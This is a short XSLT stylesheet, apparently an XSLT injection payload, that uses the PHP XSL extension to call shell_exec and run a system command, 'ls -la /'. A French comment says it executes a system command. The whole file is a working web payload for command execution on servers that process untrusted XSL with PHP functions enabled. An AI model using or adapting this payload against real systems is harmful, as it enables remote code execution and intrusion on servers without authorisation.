<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
                xmlns:php="http://php.net/xsl" version="1.0">

    <xsl:template match="/">
        <!-- Exécuter une commande système -->
        <xsl:value-of select="php:function('shell_exec', 'ls -la /')" />
    </xsl:template>
</xsl:stylesheet>
